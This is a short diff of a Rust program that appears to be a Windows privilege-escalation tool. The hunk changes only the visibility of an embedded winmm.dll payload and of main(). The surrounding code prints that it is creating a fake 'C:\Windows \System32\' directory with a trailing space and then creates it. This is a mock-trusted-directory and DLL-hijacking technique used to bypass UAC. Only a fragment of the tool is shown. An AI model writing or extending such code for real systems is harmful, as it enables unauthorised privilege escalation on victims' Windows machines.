@@ -1,8 +1,8 @@
 use std::{fs, os::windows::process::CommandExt, process::Command};
 
-pub static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.dll"));
+static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.dll"));
 
-fn main() {
+pub fn main() {
   println!(r"[+] Creating fake directory C:\Windows \System32\...");
   fs::create_dir_all(r"C:\Windows \System32\").unwrap();
 
